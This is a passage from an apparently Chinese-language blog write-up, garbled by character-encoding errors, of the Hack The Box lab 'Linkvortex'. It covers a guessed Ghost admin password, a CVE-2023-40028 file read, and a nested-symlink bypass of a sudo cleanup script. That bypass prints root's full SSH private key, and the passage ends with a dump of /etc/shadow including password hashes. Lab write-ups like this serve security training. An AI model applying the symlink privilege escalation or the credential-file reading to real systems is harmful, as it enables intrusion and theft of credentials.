ï¼ˆé—®å°±æ˜¯ä¸€ä¸ªä¸ªæ‰¾ï¼‰\n\n![Linkvortex/image-20241208134515379](Linkvortex/image-20241208134515379.png)\n\n![Linkvortex/image-20241208134601369](Linkvortex/image-20241208134601369.png)\n\n![Linkvortex/image-20241208134611578](Linkvortex/image-20241208134611578.png)\n\n![Linkvortex/image-20241208134623654](Linkvortex/image-20241208134623654.png)\n\næ•´ç†å‡ºæ¥åé€ä¸€å°è¯•ï¼Œå¾—åˆ°å¯†ç ä¸º**OctopiFociPilfer45S**\n\nåˆ©ç”¨å‡­è¯admin@linkvortex.htb/OctopiFociPilfer45Sè¿›å…¥åå°åï¼Œå¯ä»¥çœ‹åˆ°ghostç‰ˆæœ¬ä¸º5.58ï¼Œæœç´¢åå‘ç°å­˜åœ¨CVE-2023-40028\n\n## CVE-2023-40028\n\n![Linkvortex/image-20241208134839916](Linkvortex/image-20241208134839916.png)\n\nåˆ©ç”¨POCï¼ŒæŸ¥çœ‹æ˜¯å¦èƒ½å¤Ÿè¯»å–æ–‡ä»¶\n\n![Linkvortex/image-20241208134950803](Linkvortex/image-20241208134950803.png)\n\nè¿™é‡Œè¯»å–ghostç»„ä»¶ä¸­çš„æ•æ„Ÿæ–‡ä»¶config.production.json\n\n![Linkvortex/image-20241208135224392](Linkvortex/image-20241208135224392.png)\n\nå¾—åˆ°bobç”¨æˆ·çš„å¯†ç åï¼Œä½¿ç”¨SSHç™»å½•\n\n## è„šæœ¬åˆ©ç”¨\n\næŸ¥çœ‹bobç”¨æˆ·å¯æ‰§è¡Œçš„æƒé™\n\n![Linkvortex/image-20241208135307819](Linkvortex/image-20241208135307819.png)\n\næŸ¥çœ‹clean_symlink.shè„šæœ¬\n\n```sh\n#!/bin/bash\n\nQUAR_DIR=\"/var/quarantined\"\n\nif [ -z $CHECK_CONTENT ];then\n  CHECK_CONTENT=false\nfi\n\nLINK=$1\n\nif ! [[ \"$LINK\" =~ \\.png$ ]]; then\n  /usr/bin/echo \"! First argument must be a png file !\"\n  exit 2\nfi\n\nif /usr/bin/sudo /usr/bin/test -L $LINK;then\n  LINK_NAME=$(/usr/bin/basename $LINK)\n  LINK_TARGET=$(/usr/bin/readlink $LINK)\n  if /usr/bin/echo \"$LINK_TARGET\" | /usr/bin/grep -Eq '(etc|root)';then\n    /usr/bin/echo \"! Trying to read critical files, removing link [ $LINK ] !\"\n    /usr/bin/unlink $LINK\n  else\n    /usr/bin/echo \"Link found [ $LINK ] , moving it to quarantine\"\n    /usr/bin/mv $LINK $QUAR_DIR/\n    if $CHECK_CONTENT;then\n      /usr/bin/echo \"Content:\"\n      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null\n    fi\n  fi\nfi\n```\n\nä¸¢è¿›AIé—®ä¸€é—®\n\n![Linkvortex/image-20241208135613865](Linkvortex/image-20241208135613865.png)\n\nè¿™é‡Œå¯ä»¥åˆ©ç”¨åµŒå¥—çš„æ–¹å¼ç»•è¿‡æ£€æŸ¥\n\n```bash\nexport CHECK_CONTENT=true\nln -s /home/bob/test.png /home/bob/exploit.png \n# åˆ›å»ºä¸€ä¸ªexploit.pngæŒ‡å‘test.png\n\nln -sf /root/.ssh/id_rsa /home/bob/test.png\n# åˆ›å»ºé“¾æ¥ä½¿å¾—test.pngæŒ‡å‘id_rsa\n# ç»è¿‡ä¸Šè¿°å¤„ç†åï¼Œè¡¨é¢ä¸Šexploit.pngæŒ‡å‘çš„æ˜¯test.pngï¼Œå®é™…ä¸ŠæŒ‡å‘çš„æ˜¯id_rsa\n\nsudo /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/exploit.png\nLink found [ /home/bob/exploit.png ] , moving it to quarantine\nContent:\n-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----\n```\n\nä½¿ç”¨id_rsaç™»å½•åˆ°rootç”¨æˆ·\n\n![Linkvortex/image-20241208140259700](Linkvortex/image-20241208140259700.png)\n\n```bash\n# /etc/shadow\nroot:$y$j9T$C3zg87gHwrCXO0vl4igIh/$iisf9sVwilKAi7mI5p1FqQslJWM9t2.YUWznIPC/XIA:19814:0:99999:7:::\ndaemon:*:19579:0:99999:7:::\nbin:*:19579:0:99999:7:::\nsys:*:19579:0:99999:7:::\nsync:*:19579:0:99999:7:::\ngames:*:19579:0:99999:7:::\nman:*:19579:0:99999:7:::\nlp:*:19579:0:99999:7:::\nmail:*:19579:0:99999:7:::\nnews:*:19579:0:99999:7:::\nuucp:*:19579:0:99999:7:::\nproxy:*:19579:0:99999:7:::\nwww-data:*:19579:0:99999:7:::\nbackup:*:19579:0:99999:7:::\nlist:*:19579:0:99999:7:::\nirc:*:19579:0:99999:7:::\ngnats:*:19579:0:99999:7:::\nnobody:*:19579:0:99999:7:::\n_apt:*:19579:0:99999:7:::\nsystemd-network:*:19579:0:99999:7:::\nsystemd-resolve:*:19579:0:99999:7:::\nmessagebus:*:19579:0:99999:7:::\nsystemd-timesync:*:19579:0:99999:7:::\npollinate:*:19579:0:99999:7:::\nsshd:*:19579:0:99999:7:::\nusbmux:*:19814:0:99999:7:::\nbob:$6$rounds=656000$4p3mw8hAd9ir.25f$ocGm9nW1TM2AB8Z.l0K.hi43bOrm3oxQsaKFACMoS2UL.tIXxSW3u/xsClrvkEhP5s.GUpdIvCX3qRtppDV8r.:19814:0:99999:7:::\ndnsmasq:*:19814:0:99999:7:::\n_laurel:!:20057::::::\n```\n","tags":["HTB"]},{"title":"åšå®¢ä»‹ç»","url":"/2024/12/05/Start/","content":"è¿™é‡Œæ˜¯YiM2onZhoiçš„GitHubä¸ªäººåšå®¢ï¼Œä¸å®šæœŸåˆ†äº«å„ç±»é¶åœºæ€è·¯ä»¥åŠä¸€äº›çŸ¥è¯†ç½‘å€ç­‰ã€‚\n"}]